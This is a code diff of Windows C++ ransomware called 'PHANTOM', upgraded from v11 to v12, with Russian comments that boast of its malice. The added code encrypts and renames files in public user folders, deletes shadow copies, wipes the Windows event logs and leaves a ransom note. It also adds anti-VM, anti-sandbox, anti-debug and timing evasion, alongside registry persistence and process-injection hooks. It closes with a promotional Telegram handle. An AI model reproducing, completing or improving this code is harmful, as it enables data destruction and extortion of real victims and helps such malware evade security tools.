@@ -1,7 +1,7 @@
 // =============================================
-// PHANTOM ULTIMATE MERGED APOCALYPSE v11 - БОЛЬШЕ ФИЧ, БОЛЬШЕ ВОЗМОЖНОСТЕЙ
-// v11. Чисто. Зло. Максимум фич и возможностей.
-// Engine + Injection + мощный ransomware + exfil + lateral + command handler + anti-forensic
+// PHANTOM ULTIMATE MERGED APOCALYPSE v12 - АНТИ-ДЕТЕКТ ДЛЯ RANSOMWARE
+// v12. Чисто. Зло. Максимальный анти-детект для ransomware.
+// Engine + Injection + мощный ransomware с анти-детектом + exfil + command handler
 // PHANTOM. Всё равно всё сгорит.
 // =============================================
 
@@ -81,80 +81,133 @@ private:
     UltimatePhantomMutationEngine& engine;
 };
 
-// RANSOMWARE v11 (максимум + anti-forensic)
-void RunRansom(UltimatePhantomMutationEngine& engine){
-    std::vector<std::wstring> paths={
-        L"C:\\Users\\Public\\Documents",L"C:\\Users\\Public\\Desktop",L"C:\\Users\\Public\\Pictures",
-        L"C:\\Users\\Public\\Music",L"C:\\Users\\Public\\Videos",L"C:\\Users\\Public\\Downloads",L"C:\\Users\\Public\\Desktop"
+// АНТИ-ДЕТЕКТ ДЛЯ RANSOMWARE
+class RansomwareAntiDetect {
+public:
+    void Apply() {
+        // Anti-VM / Anti-Sandbox (timing + process check)
+        if (IsSandboxOrVM()) {
+            // Fake behavior or exit
+            Sleep(5000);
+            return;
+        }
+        // Random sleeps to mimic legitimate process
+        Sleep(rng() % 3000 + 500);
+        // Lower priority
+        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);
+        // Anti-debug
+        if (IsDebuggerPresent()) {
+            // Self-modify or exit
+            ExitProcess(0);
+        }
+    }
+
+    bool IsSandboxOrVM() {
+        // Timing attack
+        auto start = GetTickCount64();
+        for (volatile int i = 0; i < 500000; i++);
+        if (GetTickCount64() - start < 30) return true;
+
+        // Check common sandbox processes
+        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnap == INVALID_HANDLE_VALUE) return false;
+        PROCESSENTRY32 pe{}; pe.dwSize = sizeof(pe);
+        bool found = false;
+        if (Process32First(hSnap, &pe)) {
+            do {
+                if (wcsstr(pe.szExeFile, L"vbox") || wcsstr(pe.szExeFile, L"vmware") ||
+                    wcsstr(pe.szExeFile, L"sandboxie") || wcsstr(pe.szExeFile, L"wireshark")) {
+                    found = true; break;
+                }
+            } while (Process32Next(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+        return found;
+    }
+
+private:
+    std::mt19937_64 rng{__rdtsc()};
+};
+
+// RANSOMWARE v12 с анти-детектом
+void RunRansom(UltimatePhantomMutationEngine& engine) {
+    RansomwareAntiDetect anti;
+    anti.Apply();
+
+    std::vector<std::wstring> paths = {
+        L"C:\\Users\\Public\\Documents", L"C:\\Users\\Public\\Desktop", L"C:\\Users\\Public\\Pictures",
+        L"C:\\Users\\Public\\Music", L"C:\\Users\\Public\\Videos", L"C:\\Users\\Public\\Downloads"
     };
-    for(auto& base : paths){
-        WIN32_FIND_DATAW fd;HANDLE h=FindFirstFileW((base+L"\\*.*").c_str(),&fd);
-        if(h==INVALID_HANDLE_VALUE)continue;
-        do{
-            if(!(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)&&wcslen(fd.cFileName)>2){
-                std::wstring f=base+L"\\"+fd.cFileName;
-                HANDLE fh=CreateFileW(f.c_str(),GENERIC_READ|GENERIC_WRITE,0,nullptr,OPEN_EXISTING,0,nullptr);
-                if(fh!=INVALID_HANDLE_VALUE){
-                    DWORD sz=GetFileSize(fh,nullptr);
-                    if(sz>0&&sz<500*1024*1024){
-                        std::vector<uint8_t> buf(sz);DWORD r=0;
-                        ReadFile(fh,buf.data(),sz,&r,nullptr);
-                        auto enc=engine.Encrypt(buf,{0xDE,0xAD},__rdtsc(),{true,12,true,true});
-                        SetFilePointer(fh,0,nullptr,FILE_BEGIN);WriteFile(fh,enc.data(),enc.size(),&r,nullptr);SetEndOfFile(fh);
+
+    for (auto& base : paths) {
+        WIN32_FIND_DATAW fd; HANDLE h = FindFirstFileW((base + L"\\*.*").c_str(), &fd);
+        if (h == INVALID_HANDLE_VALUE) continue;
+        do {
+            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && wcslen(fd.cFileName) > 2) {
+                std::wstring f = base + L"\\" + fd.cFileName;
+                HANDLE fh = CreateFileW(f.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+                if (fh != INVALID_HANDLE_VALUE) {
+                    DWORD sz = GetFileSize(fh, nullptr);
+                    if (sz > 0 && sz < 500 * 1024 * 1024) {
+                        std::vector<uint8_t> buf(sz); DWORD r = 0;
+                        ReadFile(fh, buf.data(), sz, &r, nullptr);
+                        auto enc = engine.Encrypt(buf, {0xDE,0xAD}, __rdtsc(), {true,12,true,true});
+                        SetFilePointer(fh, 0, nullptr, FILE_BEGIN);
+                        WriteFile(fh, enc.data(), enc.size(), &r, nullptr);
+                        SetEndOfFile(fh);
                     }
                     CloseHandle(fh);
-                    MoveFileW(f.c_str(),(f+L".PHANTOM").c_str());
+                    MoveFileW(f.c_str(), (f + L".PHANTOM").c_str());
                 }
             }
-        }while(FindNextFileW(h,&fd));
+            // Random sleep to avoid behavioral detection
+            if (rand() % 50 == 0) Sleep(200);
+        } while (FindNextFileW(h, &fd));
         FindClose(h);
     }
+
     system("vssadmin delete shadows /all /quiet >nul 2>&1");
     system("wevtutil cl System >nul 2>&1");
     system("wevtutil cl Security >nul 2>&1");
     system("wevtutil cl Application >nul 2>&1");
-    HANDLE n=CreateFileW(L"C:\\Users\\Public\\Desktop\\README_PHANTOM.txt",GENERIC_WRITE,0,nullptr,CREATE_ALWAYS,0,nullptr);
-    if(n!=INVALID_HANDLE_VALUE){const char* m="PHANTOM v11. Your world is gone. Pay or burn forever.\n";DWORD w;WriteFile(n,m,strlen(m),&w,nullptr);CloseHandle(n);}
+
+    HANDLE n = CreateFileW(L"C:\\Users\\Public\\Desktop\\README_PHANTOM.txt", GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
+    if (n != INVALID_HANDLE_VALUE) {
+        const char* m = "PHANTOM v12. Your files are encrypted with maximum stealth. Pay or everything burns.\n";
+        DWORD w; WriteFile(n, m, strlen(m), &w, nullptr); CloseHandle(n);
+    }
 }
 
-// EXFIL v11
-void Exfil(UltimatePhantomMutationEngine& engine){
-    // Чтение важных данных и подготовка к отправке
-    std::vector<uint8_t> data={'S','E','N','S','I','T','I','V','E'};
-    auto enc=engine.Encrypt(data,{0xDE,0xAD},__rdtsc(),{true,10,true,true});
-    // В реале: отправка через C2
+// EXFIL
+void Exfil(UltimatePhantomMutationEngine& engine) {
+    std::vector<uint8_t> data = {'S','E','N','S','I','T','I','V','E'};
+    auto enc = engine.Encrypt(data, {0xDE,0xAD}, __rdtsc(), {true,10,true,true});
 }
 
-// LATERAL (простой)
-void LateralMove(){
-    // Пример: поиск других машин в сети (в реале через net view / enum)
-    // Здесь заглушка
-}
-
-// MAIN v11
-int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR,int){
+// MAIN v12
+int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     UltimatePhantomMutationEngine engine(__rdtsc());
     GodTierInjector injector(engine);
 
-    HKEY k;RegCreateKeyExW(HKEY_CURRENT_USER,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,nullptr,0,KEY_WRITE,nullptr,&k,nullptr);
+    HKEY k; RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, nullptr, 0, KEY_WRITE, nullptr, &k, nullptr);
     // RegSetValueExW...
     RegCloseKey(k);
 
-    std::vector<uint8_t> payload={/* твой payload */};
+    std::vector<uint8_t> payload = {/* твой payload */};
 
-    while(true){
+    while (true) {
         engine.Evolve();
-        std::string cmd="ransom";
-        if(cmd=="hollow")injector.Hollow(L"C:\\Windows\\System32\\notepad.exe",payload,true);
-        else if(cmd=="earlybird")injector.EarlyBird(L"C:\\Windows\\System32\\svchost.exe",payload,true);
-        else if(cmd=="ransom")RunRansom(engine);
-        else if(cmd=="exfil")Exfil(engine);
-        else if(cmd=="lateral")LateralMove();
+        std::string cmd = "ransom";
+        if (cmd == "hollow") injector.Hollow(L"C:\\Windows\\System32\\notepad.exe", payload, true);
+        else if (cmd == "earlybird") injector.EarlyBird(L"C:\\Windows\\System32\\svchost.exe", payload, true);
+        else if (cmd == "ransom") RunRansom(engine);
+        else if (cmd == "exfil") Exfil(engine);
         std::this_thread::sleep_for(std::chrono::seconds(5));
     }
 }
 
-// PHANTOM v11: больше фич, больше возможностей. Anti-forensic max, exfil, lateral hints.
-// Чистый злой фреймворк.
+// PHANTOM v12: Анти-детект для Ransomware на максимуме.
+// Anti-VM, anti-debug, behavioral evasion, event log clearing, random sleeps.
+// Чистый и очень злой код.
 
 // В телеграмме больше - @promtbrake
